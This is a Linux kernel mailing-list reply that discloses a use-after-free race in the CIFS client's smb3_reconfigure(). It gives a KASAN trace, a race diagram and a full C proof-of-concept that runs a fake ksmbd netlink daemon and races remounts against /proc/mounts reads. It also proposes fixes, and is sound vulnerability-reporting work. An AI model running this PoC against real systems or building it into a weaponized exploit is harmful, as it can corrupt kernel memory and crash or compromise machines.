Received: from xmbghk7.mail.qq.com (xmbghk7.mail.qq.com [43.163.128.54])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 4D98736A35D;
	Fri, 12 Jun 2026 22:14:31 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=43.163.128.54
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1781302475; cv=none; b=fi8Tc2xfFHtT0qsQIbY2CF5aiJ4riQoCQJ6HlAeDsQMqjQ3rNWXu9ODRzzqD53/Bn5bfNzyXdBau+CZgs0qk3rx9BrWQyOemNJfO3ro3t9bj4fbvyu376N7+Ur6Vpx5oTE5gAdVd7Uz5/G4pm+tS8x/x34dJe8cXRJ/7YhR3URI=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1781302475; c=relaxed/simple;
	bh=NvPtLW2HrGiyO/DH/sTRYzn+3Jh7FFnGPkitmwWzGMA=;
	h=Message-ID:Date:MIME-Version:Subject:To:Cc:References:From:
	 In-Reply-To:Content-Type; b=lRukiFg1aW2hPJMAot2cRDCOGhvkYeeCobqIjbbq4ORpPlwJx2Qz2NnbPt30u/YszRygzIk20c4LRjXhBhu+fOw+kPW6zzhGlgNC0BHs6RL7OlJFG1gYNrS9Zrd0BZNCzeSFKTl/KNoX0fUBgHhIcgb7d/16ExYuiYhdTv3ALNg=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=qq.com; spf=pass smtp.mailfrom=qq.com; dkim=pass (1024-bit key) header.d=qq.com header.i=@qq.com header.b=pncS6N8Q; arc=none smtp.client-ip=43.163.128.54
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=qq.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=qq.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (1024-bit key) header.d=qq.com header.i=@qq.com header.b="pncS6N8Q"
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=qq.com; s=s201512;
	t=1781302469; bh=6/1x+8mhqzdjjTgVDRCHIu55wXbn2ozvgkE6BaiEBfs=;
	h=Date:Subject:To:Cc:References:From:In-Reply-To;
	b=pncS6N8QB/7LQ9Wrun5HeYXTBQbhAsYyqeKakMo03J+EsGhstSBkbE1UrQCDhZqrZ
	 pR3wbPii4RY4yN0PK+1o48ucW8f5jE7LyfmU57FP7zGIUop2Aj3xcFLHQaYzTZMesu
	 q4Ug9k4ZIJV5XLLdx2VcO8tqiri8zC5sTbHAYB/w=
Received: from [192.168.1.102] ([218.106.117.236])
	by newxmesmtplogicsvrsza73-0.qq.com (NewEsmtp) with SMTP
	id 39B340D5; Sat, 13 Jun 2026 06:14:27 +0800
X-QQ-mid: xmsmtpt1781302467tvcyf6h7k
Message-ID: <tencent_EE4C708E8D6128756512BCFEC902C8388808@qq.com>
X-QQ-XMAILINFO: OVFdYp27KdlJgAsd//FsMkM6pJPsPLR6GPbTNrdg94hjbcvEFMyOB531zuOCiV
	 1nybzw4aO7bEcBEuyGjdhbp7eTIOteM5Q72iRa2SKxVOlQKBp79CeFG26hMHPwEMJJ/FquvIBvP1
	 C/Tl8GZ0mzKRhvO0UAfX+6FbwvpdFNy4KbR32JPy+UZpcfz6FKbOV2Q8NcQhznEMRy/DlLUjwX8C
	 8N3HhW2ZG060Tx43Aeu5cK+oD3Os/4HS1t3F4Lltbd6Acebb8XzEsbqcb8za5sq9Ke2/ej8nftj9
	 FOmXjICcdfyuTKfNA8+070GPOWDdKHDo+CzipUSHSIkjHeYEAViMn2WjvfQtINtvJA06hpj6t+WM
	 1aziPI4Ph9vcYGG6I4sFLcsWkFw4GHhiePxY14cbPQm3cfgSB5jIpxXZMmBUPNvsSY0docxjI/TA
	 zU0nS+MQjjYyZEp0QFdEHa5H50/j9PyeYqkksJDxHUpseJ+VjpB7v548mStxLTk6K3NOPs/7gQ8N
	 fVUzvu8Ob9Coryo2c7fE/DcpvftyPwDxzVkAezgW3vZHeus5N9OhsXI1S+tAtOI3XkqJv5vyvYUO
	 dHJx34n9tKuj2l7iboZ4uKCLU2SnO1nJBqz0DBibjLO5R0I0AOpMR5QGBSPXIx/LUq4Q+CH8x3/f
	 0h0TAnTjWImhtKtF9rbxzDQ+Hiys/n8zka6alWQ95CywLQI/aHcWDkFdOfKGfccjVCVqeVtsRtFk
	 4oAskx69EOvB/3qiOxQOxOutRNfQGPdykhwmzNCuePQiq+n7DDHDeLYX8FBvmAxNkP2Pm9FrF0j6
	 rn/o7kBSRmmbXztVggMHbsmY/XFxn3B1lgXIkcFY9ddUHy9CvXI6llvdk7szhDTJbOuO0QGFo6Np
	 FfCTmoZDHj5+44pTs5UIvy7wAaN8SGfJykzBfX/4G3VNKhF9JJpUSxD0GrFYJChhrUdFHTBxwsRZ
	 f95nIVzBjy4Mpo0UMjbyAkwAoH6w3mNyRfW0v25tUzY7Gtm6bw6Zyp/KtDzZoru7pm5mIfWMLZNR
	 SBouTTbVtF35SPEpPwI+NGrHmoriBy63C0KZINHU5TF0THjt7a64piIs+BBiYpi9zOvqkEo0Tt/P
	 od0aw4
X-QQ-XMRINFO: NyFYKkN4Ny6FuXrnB5Ye7Aabb3ujjtK+gg==
X-OQ-MSGID: <e91613d8-eeb8-4083-a97b-859014e544b4@qq.com>
Date: Sat, 13 Jun 2026 06:14:27 +0800
Precedence: bulk
X-Mailing-List: linux-cifs@vger.kernel.org
List-Id: <linux-cifs.vger.kernel.org>
List-Subscribe: <mailto:linux-cifs+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-cifs+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
User-Agent: Mozilla Thunderbird
Subject: Re: [PATCH] smb: client: Use more common error handling code in
 smb3_reconfigure()
To: Markus Elfring <Markus.Elfring@web.de>, linux-cifs@vger.kernel.org,
 samba-technical@lists.samba.org, Bharath SM <bharathsm@microsoft.com>,
 Paulo Alcantara <pc@manguebit.org>,
 Ronnie Sahlberg <ronniesahlberg@gmail.com>,
 Shyam Prasad N <sprasad@microsoft.com>, Steve French <sfrench@samba.org>,
 Tom Talpey <tom@talpey.com>
Cc: LKML <linux-kernel@vger.kernel.org>, kernel-janitors@vger.kernel.org
References: <328ba830-24f6-4358-b88f-9aec843ecf14@web.de>
From: XIAO WU <xiaowu.417@qq.com>
In-Reply-To: <328ba830-24f6-4358-b88f-9aec843ecf14@web.de>
Content-Type: text/plain; charset=UTF-8; format=flowed
Content-Transfer-Encoding: 8bit

Hi Markus,

On Thu, 11 Jun 2026 17:33:39 +0200, Markus Elfring wrote:
 > Use an additional label so that a bit of exception handling can be better
 > reused at the end of this function implementation.

While this refactoring itself looks fine, I noticed a Sashiko review[1]
pointing out a pre-existing use-after-free race in smb3_reconfigure()
that affects the same code path.  I wrote a PoC to verify it and was
able to trigger the bug reliably on a KASAN-enabled kernel.

The problem is that smb3_reconfigure() modifies cifs_sb->ctx in place:
smb3_cleanup_fs_context_contents() frees the dynamically allocated
strings inside the active context and sets their pointers to NULL,
then memcpy() restores them from old_ctx.  Concurrent readers of
/proc/mounts do not hold the VFS s_umount lock, so they can access
these strings while they are being freed or are temporarily NULL.

My PoC races MS_REMOUNT calls against threads continuously reading
/proc/mounts.  Within a few iterations this triggers:

==================================================================
BUG: KASAN: slab-use-after-free in kstrdup+0x89/0xf0
Read of size 15 at addr ffff88810b75b1f0 by task poc/9956

Call Trace:
  <TASK>
  dump_stack_lvl+0x116/0x1f0
  print_report+0xf4/0x600
  kasan_report+0xe0/0x110
  kasan_check_range+0x100/0x1b0
  __asan_memcpy+0x23/0x60
  kstrdup+0x89/0xf0
  cifs_show_devname+0xbc/0x1a0       <-- /proc/mounts reader
  show_vfsmnt+0x154/0x3a0
  seq_read_iter+0xb2a/0x12d0
  vfs_read+0x8c4/0xcf0
  ksys_read+0x12f/0x250
  do_syscall_64+0x129/0x850
  entry_SYSCALL_64_after_hwframe+0x77/0x7f

Allocated by task 9944:
  kstrdup+0x56/0xf0
  smb3_fs_context_dup+0x539/0xb20
  smb3_reconfigure+0xf6f/0x2690     <-- remount allocation
  reconfigure_super+0x455/0xb60
  path_mount+0x1a3a/0x2390

Freed by task 9944:
  kfree+0x171/0x720
  smb3_cleanup_fs_context_contents.part.0+0x1ae/0x560  <-- freed here
  smb3_fs_context_free+0x49/0x60
  put_fs_context+0x15a/0x9b0
  path_mount+0xd5c/0x2390
==================================================================

The race window:

   CPU 0 (remount)                        CPU 1 (/proc/mounts reader)
   ===============                        ==========================
   smb3_reconfigure()
     smb3_cleanup_fs_context_contents()
       kfree(cifs_sb->ctx->devname)       ...
         ...                              cifs_show_devname()
         ... kstrdup(cifs_sb->ctx->devname)
         ...                                ^ UAF — memory already freed

I wrote the following PoC to reproduce this reliably.  It starts a
ksmbd IPC daemon, mounts a CIFS share, then races continuous remount
calls against /proc/mounts readers.  The full PoC source follows.

---8<--- poc.c ---
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <errno.h>
#include <signal.h>
#include <pthread.h>
#include <linux/netlink.h>
#include <linux/genetlink.h>
#include <netinet/in.h>

#define SHARE_DIR "/tmp/smb_share"
#define MOUNT_POINT "/tmp/cifs_mount"

#define KSMBD_GENL_NAME "SMBD_GENL"
#define KSMBD_GENL_VERSION 1
#define KSMBD_EVENT_STARTING_UP 2
#define KSMBD_EVENT_LOGIN_REQUEST 4
#define KSMBD_EVENT_LOGIN_RESPONSE 5
#define KSMBD_EVENT_SHARE_CONFIG_REQUEST 6
#define KSMBD_EVENT_SHARE_CONFIG_RESPONSE 7
#define KSMBD_EVENT_TREE_CONNECT_REQUEST 8
#define KSMBD_EVENT_TREE_CONNECT_RESPONSE 9

struct startup_req {
     __u32 flags; __s32 signing; __s8 min_prot[16]; __s8 max_prot[16];
     __s8 netbios_name[16]; __s8 work_group[64]; __s8 server_string[64];
     __u16 tcp_port; __u16 ipc_timeout; __u32 deadtime; __u32 file_max;
     __u32 smb2_max_write; __u32 smb2_max_read; __u32 smb2_max_trans;
     __u32 share_fake_fscaps; __u32 sub_auth[3]; __u32 smb2_max_credits;
     __u32 smbd_max_io_size; __u32 max_connections; __s8 
bind_interfaces_only;
     __u32 max_ip_connections; __s8 reserved[499]; __u32 ifc_list_sz; 
__s8 payload[];
} __attribute__((packed));

struct login_req  { __u32 handle; __s8 account[48]; __u32 rsv[16]; };
struct login_rsp  { __u32 handle; __u32 gid; __u32 uid; __s8 
account[48]; __u16 status; __u16 hash_sz; __s8 hash[18]; __u32 rsv[16]; };
struct share_req  { __u32 handle; __s8 share_name[64]; __u32 rsv[16]; };
struct share_rsp  { __u32 handle; __u32 flags; __u16 create_mask; __u16 
dir_mask; __u16 fcm; __u16 fdm; __u16 fuid; __u16 fgid; __s8 
share_name[64]; __u32 rsv[111]; __u32 payload_sz; __u32 veto_list_sz; 
__s8 payload[]; };
struct tree_req   { __u32 handle; __u16 af; __u16 f; __u64 sid; __u64 
cid; __s8 account[48]; __s8 share[64]; __s8 peer[64]; __u32 rsv[16]; };
struct tree_rsp   { __u32 handle; __u16 status; __u16 conn_flags; __u32 
rsv[16]; };

#define MY_NLA_OK(nla, rem) ((rem) >= (int)sizeof(struct nlattr) && 
(nla)->nla_len >= sizeof(struct nlattr) && (int)(nla)->nla_len <= (rem))
#define MY_NLA_NEXT(nla, rem) ((rem) -= (((nla)->nla_len + 3) & ~3), 
(struct nlattr *)((char *)(nla) + (((nla)->nla_len + 3) & ~3)))

static volatile int stop_flag = 0;
static volatile int crash_detected = 0;

static int run_cmd(const char *cmd)
{
     int ret = system(cmd);
     if (ret == -1) return -1;
     if (WIFEXITED(ret) && WEXITSTATUS(ret) != 0) return WEXITSTATUS(ret);
     return 0;
}

/*
  * Minimal ksmbd IPC daemon via generic netlink — provides just enough
  * of the SMBD_GENL protocol for the kernel CIFS client to mount and
  * remount a share.
  */
static int daemon_ksmbd_ipc(void)
{
     int fd, family_id = -1, ret;
     struct sockaddr_nl sa;
     char buf[8192];

     fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
     if (fd < 0) { perror("sock"); return -1; }
     memset(&sa, 0, sizeof(sa));
     sa.nl_family = AF_NETLINK;
     sa.nl_pid = getpid();
     if (bind(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) { 
perror("bind"); close(fd); return -1; }

     /* CTRL_CMD_GETFAMILY for SMBD_GENL */
     memset(buf, 0, sizeof(buf));
     struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
     struct genlmsghdr *genlh = (struct genlmsghdr *)(buf + NLMSG_HDRLEN);
     nlh->nlmsg_len = NLMSG_LENGTH(GENL_HDRLEN);
     nlh->nlmsg_type = GENL_ID_CTRL;
     nlh->nlmsg_flags = NLM_F_REQUEST;
     nlh->nlmsg_seq = 1; nlh->nlmsg_pid = getpid();
     genlh->cmd = CTRL_CMD_GETFAMILY; genlh->version = 2;
     struct nlattr *a = (struct nlattr *)(buf + NLMSG_HDRLEN + GENL_HDRLEN);
     a->nla_type = CTRL_ATTR_FAMILY_NAME;
     a->nla_len = NLA_HDRLEN + strlen(KSMBD_GENL_NAME) + 1;
     memcpy((char *)a + NLA_HDRLEN, KSMBD_GENL_NAME, 
strlen(KSMBD_GENL_NAME) + 1);
     nlh->nlmsg_len = NLMSG_LENGTH(GENL_HDRLEN) + a->nla_len;

     struct sockaddr_nl dst;
     memset(&dst, 0, sizeof(dst)); dst.nl_family = AF_NETLINK; 
dst.nl_pid = 0;
     struct iovec iov[1]; iov[0].iov_base = buf; iov[0].iov_len = 
nlh->nlmsg_len;
     struct msghdr msg; memset(&msg, 0, sizeof(msg));
     msg.msg_name = &dst; msg.msg_namelen = sizeof(dst); msg.msg_iov = 
iov; msg.msg_iovlen = 1;
     ret = sendmsg(fd, &msg, 0);
     if (ret < 0) { perror("send1"); close(fd); return -1; }
     ret = recv(fd, buf, sizeof(buf), 0);
     if (ret < 0) { perror("recv1"); close(fd); return -1; }
     if (nlh->nlmsg_type == NLMSG_ERROR) {
         struct nlmsgerr *e = NLMSG_DATA(nlh);
         fprintf(stderr, "err %d\n", e->error); close(fd); return -1;
     }
     int remaining = nlh->nlmsg_len - NLMSG_HDRLEN - GENL_HDRLEN;
     struct nlattr *ra = (struct nlattr *)((char *)nlh + NLMSG_HDRLEN + 
GENL_HDRLEN);
     while (MY_NLA_OK(ra, remaining)) {
         if (ra->nla_type == CTRL_ATTR_FAMILY_ID) {
             family_id = *(int *)((char *)ra + NLA_HDRLEN);
             break;
         }
         ra = MY_NLA_NEXT(ra, remaining);
     }
     if (family_id < 0) { fprintf(stderr, "no SMBD_GENL\n"); close(fd); 
return -1; }

     /* KSMBD_EVENT_STARTING_UP */
     char rq[sizeof(struct startup_req)];
     struct startup_req *sr = (struct startup_req *)rq;
     memset(rq, 0, sizeof(rq));
     sr->tcp_port = htons(445); sr->file_max = 100;
     sr->smb2_max_write = 65536; sr->smb2_max_read = 65536; 
sr->smb2_max_trans = 65536;
     sr->max_connections = 10;
     strcpy((char *)sr->min_prot, "2.1"); strcpy((char *)sr->max_prot, 
"3.1.1");
     strcpy((char *)sr->netbios_name, "POC");
     strcpy((char *)sr->work_group, "WORKGROUP");
     strcpy((char *)sr->server_string, "PoC");

     memset(buf, 0, sizeof(buf));
     nlh = (struct nlmsghdr *)buf;
     genlh = (struct genlmsghdr *)(buf + NLMSG_HDRLEN);
     nlh->nlmsg_type = family_id;
     nlh->nlmsg_flags = NLM_F_REQUEST;
     nlh->nlmsg_seq = 2; nlh->nlmsg_pid = getpid();
     genlh->cmd = KSMBD_EVENT_STARTING_UP; genlh->version = 
KSMBD_GENL_VERSION;
     struct nlattr *at = (struct nlattr *)(buf + NLMSG_HDRLEN + 
GENL_HDRLEN);
     at->nla_type = KSMBD_EVENT_STARTING_UP;
     at->nla_len = NLA_HDRLEN + sizeof(rq);
     memcpy((char *)at + NLA_HDRLEN, rq, sizeof(rq));
     nlh->nlmsg_len = NLMSG_LENGTH(GENL_HDRLEN) + at->nla_len;
     memset(&dst, 0, sizeof(dst)); dst.nl_family = AF_NETLINK; 
dst.nl_pid = 0;
     iov[0].iov_base = buf; iov[0].iov_len = nlh->nlmsg_len;
     memset(&msg, 0, sizeof(msg));
     msg.msg_name = &dst; msg.msg_namelen = sizeof(dst); msg.msg_iov = 
iov; msg.msg_iovlen = 1;
     ret = sendmsg(fd, &msg, 0);
     if (ret < 0) { perror("startup"); close(fd); return -1; }

     /* Event loop: handle LOGIN, SHARE_CONFIG, TREE_CONNECT requests */
     while (!stop_flag) {
         memset(buf, 0, sizeof(buf));
         ret = recv(fd, buf, sizeof(buf), 0);
         if (ret < 0) { if (errno == EINTR) continue; break; }
         if (((struct nlmsghdr *)buf)->nlmsg_type != family_id) continue;
         genlh = (struct genlmsghdr *)((char *)buf + NLMSG_HDRLEN);

         if (genlh->cmd == KSMBD_EVENT_LOGIN_REQUEST) {
             struct nlattr *attr = (struct nlattr *)((char *)buf + 
NLMSG_HDRLEN + GENL_HDRLEN);
             remaining = ((struct nlmsghdr *)buf)->nlmsg_len - 
NLMSG_HDRLEN - GENL_HDRLEN;
             while (MY_NLA_OK(attr, remaining)) {
                 if (attr->nla_type == KSMBD_EVENT_LOGIN_REQUEST) {
                     struct login_req *r = (struct login_req *)((char 
*)attr + NLA_HDRLEN);
                     struct login_rsp resp; memset(&resp, 0, sizeof(resp));
                     resp.handle = r->handle; resp.uid = 0; resp.gid = 
0; resp.status = 17;
                     strncpy((char *)resp.account, (const char 
*)r->account, 48);
                     memset(buf, 0, sizeof(buf));
                     struct nlmsghdr *on = (struct nlmsghdr *)buf;
                     struct genlmsghdr *og = (struct genlmsghdr *)(buf + 
NLMSG_HDRLEN);
                     on->nlmsg_type = family_id; on->nlmsg_flags = 
NLM_F_REQUEST; on->nlmsg_pid = getpid();
                     og->cmd = KSMBD_EVENT_LOGIN_RESPONSE; og->version = 
KSMBD_GENL_VERSION;
                     struct nlattr *oa = (struct nlattr *)(buf + 
NLMSG_HDRLEN + GENL_HDRLEN);
                     oa->nla_type = KSMBD_EVENT_LOGIN_RESPONSE;
                     oa->nla_len = NLA_HDRLEN + sizeof(resp);
                     memcpy((char *)oa + NLA_HDRLEN, &resp, sizeof(resp));
                     on->nlmsg_len = NLMSG_LENGTH(GENL_HDRLEN) + 
oa->nla_len;
                     memset(&dst,0,sizeof(dst)); 
dst.nl_family=AF_NETLINK; dst.nl_pid=0;
                     iov[0].iov_base=buf; iov[0].iov_len=on->nlmsg_len;
                     memset(&msg,0,sizeof(msg)); msg.msg_name=&dst; 
msg.msg_namelen=sizeof(dst); msg.msg_iov=iov; msg.msg_iovlen=1;
                     sendmsg(fd,&msg,0);
                     break;
                 }
                 attr = MY_NLA_NEXT(attr, remaining);
             }
         } else if (genlh->cmd == KSMBD_EVENT_SHARE_CONFIG_REQUEST) {
             struct nlattr *attr = (struct nlattr *)((char *)buf + 
NLMSG_HDRLEN + GENL_HDRLEN);
             remaining = ((struct nlmsghdr *)buf)->nlmsg_len - 
NLMSG_HDRLEN - GENL_HDRLEN;
             while (MY_NLA_OK(attr, remaining)) {
                 if (attr->nla_type == KSMBD_EVENT_SHARE_CONFIG_REQUEST) {
                     struct share_req *r = (struct share_req *)((char 
*)attr + NLA_HDRLEN);
                     char *path = SHARE_DIR;
                     int plen = strlen(path) + 1;
                     int total = sizeof(struct share_rsp) + plen;
                     char *resp_buf = malloc(total);
                     struct share_rsp *resp = (struct share_rsp *)resp_buf;
                     memset(resp, 0, total);
                     resp->handle = r->handle; resp->flags = 31;
                     resp->create_mask = 0744; resp->dir_mask = 0755;
                     resp->payload_sz = plen;
                     strncpy((char *)resp->share_name, (const char 
*)r->share_name, 64);
                     memcpy(resp->payload, path, plen);
                     memset(buf, 0, sizeof(buf));
                     struct nlmsghdr *on = (struct nlmsghdr *)buf;
                     struct genlmsghdr *og = (struct genlmsghdr *)(buf + 
NLMSG_HDRLEN);
                     on->nlmsg_type = family_id; on->nlmsg_flags = 
NLM_F_REQUEST; on->nlmsg_pid = getpid();
                     og->cmd = KSMBD_EVENT_SHARE_CONFIG_RESPONSE; 
og->version = KSMBD_GENL_VERSION;
                     struct nlattr *oa = (struct nlattr *)(buf + 
NLMSG_HDRLEN + GENL_HDRLEN);
                     oa->nla_type = KSMBD_EVENT_SHARE_CONFIG_RESPONSE;
                     oa->nla_len = NLA_HDRLEN + total;
                     memcpy((char *)oa + NLA_HDRLEN, resp, total);
                     on->nlmsg_len = NLMSG_LENGTH(GENL_HDRLEN) + 
oa->nla_len;
                     memset(&dst,0,sizeof(dst)); 
dst.nl_family=AF_NETLINK; dst.nl_pid=0;
                     iov[0].iov_base=buf; iov[0].iov_len=on->nlmsg_len;
                     memset(&msg,0,sizeof(msg)); msg.msg_name=&dst; 
msg.msg_namelen=sizeof(dst); msg.msg_iov=iov; msg.msg_iovlen=1;
                     sendmsg(fd,&msg,0);
                     free(resp_buf);
                     break;
                 }
                 attr = MY_NLA_NEXT(attr, remaining);
             }
         } else if (genlh->cmd == KSMBD_EVENT_TREE_CONNECT_REQUEST) {
             struct nlattr *attr = (struct nlattr *)((char *)buf + 
NLMSG_HDRLEN + GENL_HDRLEN);
             remaining = ((struct nlmsghdr *)buf)->nlmsg_len - 
NLMSG_HDRLEN - GENL_HDRLEN;
             while (MY_NLA_OK(attr, remaining)) {
                 if (attr->nla_type == KSMBD_EVENT_TREE_CONNECT_REQUEST) {
                     struct tree_req *r = (struct tree_req *)((char 
*)attr + NLA_HDRLEN);
                     struct tree_rsp resp; memset(&resp,0,sizeof(resp));
                     resp.handle = r->handle; resp.status = 0;
                     memset(buf, 0, sizeof(buf));
                     struct nlmsghdr *on = (struct nlmsghdr *)buf;
                     struct genlmsghdr *og = (struct genlmsghdr *)(buf + 
NLMSG_HDRLEN);
                     on->nlmsg_type = family_id; on->nlmsg_flags = 
NLM_F_REQUEST; on->nlmsg_pid = getpid();
                     og->cmd = KSMBD_EVENT_TREE_CONNECT_RESPONSE; 
og->version = KSMBD_GENL_VERSION;
                     struct nlattr *oa = (struct nlattr *)(buf + 
NLMSG_HDRLEN + GENL_HDRLEN);
                     oa->nla_type = KSMBD_EVENT_TREE_CONNECT_RESPONSE;
                     oa->nla_len = NLA_HDRLEN + sizeof(resp);
                     memcpy((char *)oa + NLA_HDRLEN, &resp, sizeof(resp));
                     on->nlmsg_len = NLMSG_LENGTH(GENL_HDRLEN) + 
oa->nla_len;
                     memset(&dst,0,sizeof(dst)); 
dst.nl_family=AF_NETLINK; dst.nl_pid=0;
                     iov[0].iov_base=buf; iov[0].iov_len=on->nlmsg_len;
                     memset(&msg,0,sizeof(msg)); msg.msg_name=&dst; 
msg.msg_namelen=sizeof(dst); msg.msg_iov=iov; msg.msg_iovlen=1;
                     sendmsg(fd,&msg,0);
                     break;
                 }
                 attr = MY_NLA_NEXT(attr, remaining);
             }
         }
     }
     close(fd);
     return 0;
}

static void *reader_thread(void *arg)
{
     (void)arg;
     char buf[8192];
     while (!stop_flag && !crash_detected) {
         int fd = open("/proc/mounts", O_RDONLY);
         if (fd >= 0) { while (read(fd, buf, sizeof(buf)) > 0); close(fd); }
         fd = open("/proc/self/mountinfo", O_RDONLY);
         if (fd >= 0) { while (read(fd, buf, sizeof(buf)) > 0); close(fd); }
         usleep(5);
     }
     return NULL;
}

int main(void)
{
     pthread_t reader1, reader2, reader3;
     int i;

     printf("PoC: smb3_reconfigure UAF race\n");

     run_cmd("umount -f " MOUNT_POINT " 2>/dev/null");
     run_cmd("rm -rf " SHARE_DIR " " MOUNT_POINT " 2>/dev/null");
     mkdir(SHARE_DIR, 0755);
     mkdir(MOUNT_POINT, 0755);
     { int fd = open(SHARE_DIR "/hello.txt", O_CREAT|O_WRONLY, 0644);
       if(fd>=0){write(fd,"world",5);close(fd);} }

     printf("Starting ksmbd IPC daemon...\n");
     pid_t daemon_pid = fork();
     if (daemon_pid == 0) { daemon_ksmbd_ipc(); _exit(0); }
     sleep(2);

     printf("Mounting CIFS...\n");
     int mount_ok = 0;
     for (i = 0; i < 15 && !mount_ok; i++) {
         if (mount("//127.0.0.1/poc", MOUNT_POINT, "cifs", 0,
"guest,vers=3.0,iocharset=utf8,noperm,nosharesock,nohandlecache") == 0)
             mount_ok = 1;
         else if (run_cmd("mount -t cifs //127.0.0.1/poc /tmp/cifs_mount "
                          "-o guest,vers=3.0,iocharset=utf8,noperm,"
                          "nosharesock,nohandlecache 2>/dev/null") == 0)
             mount_ok = 1;
         else sleep(1);
     }
     if (mount_ok) printf("Mounted OK at %s\n", MOUNT_POINT);
     else printf("Failed to mount. Trying anyway...\n");

     run_cmd("dmesg -c >/dev/null 2>&1");

     printf("Starting race...\n");
     pthread_create(&reader1, NULL, reader_thread, NULL);
     pthread_create(&reader2, NULL, reader_thread, NULL);
     pthread_create(&reader3, NULL, reader_thread, NULL);

     for (i = 0; i < 2000 && !crash_detected; i++) {
         char buf[8192];
         int fd = open("/proc/mounts", O_RDONLY);
         if (fd >= 0) { while (read(fd, buf, sizeof(buf)) > 0); close(fd); }

         if (mount_ok) {
             mount("//127.0.0.1/poc", MOUNT_POINT, "cifs", MS_REMOUNT,
                   "iocharset=utf8,uid=0");
             mount("//127.0.0.1/poc", MOUNT_POINT, "cifs", MS_REMOUNT,
                   "vers=1.0");
             mount("//127.0.0.1/poc", MOUNT_POINT, "cifs", MS_REMOUNT,
                   "username=t,password=p,domain=d");
         }
         if (i % 10 == 0) usleep(50);
     }

     stop_flag = 1;
     pthread_join(reader1, NULL); pthread_join(reader2, NULL); 
pthread_join(reader3, NULL);
     kill(daemon_pid, SIGTERM); waitpid(daemon_pid, NULL, WNOHANG);

     printf("\n=== dmesg ===\n");
     FILE *dm = popen("dmesg | tail -60", "r");
     if (dm) {
         char line[256];
         while (fgets(line, sizeof(line), dm)) {
             printf("%s", line);
             if (strstr(line,"KASAN")||strstr(line,"use-after-free")||
                 strstr(line,"BUG:")||strstr(line,"NULL pointer")||
                 strstr(line,"general protection")||strstr(line,"UAF")||
                 strstr(line,"smb3")||strstr(line,"cifs"))
                 crash_detected = 1;
         }
         pclose(dm);
     }
     if (mount_ok) umount2(MOUNT_POINT, MNT_FORCE|MNT_DETACH);
     run_cmd("rm -rf /tmp/smb_share /tmp/cifs_mount 2>/dev/null");

     if (crash_detected) { printf("\n*** BUG CONFIRMED! ***\n"); return 1; }
     printf("\nDone.\n");
     return 0;
}
---8<---

Note that this is a pre-existing issue, not introduced by your patch.
The same race exists on the success path and the error rollback path
of smb3_reconfigure() regardless of the goto restructuring.

A possible fix would be to replace the entire cifs_sb->ctx pointer
atomically rather than mutating the active context in place, or to
hold an appropriate lock around the context swap.  The Sashiko
review[1] also mentions a similar race with symlinkroot in
smb2_parse_native_symlink().

Hope this is helpful.


Best,

Xiao


[1] 
https://sashiko.dev/#/patchset/328ba830-24f6-4358-b88f-9aec843ecf14%40web.de

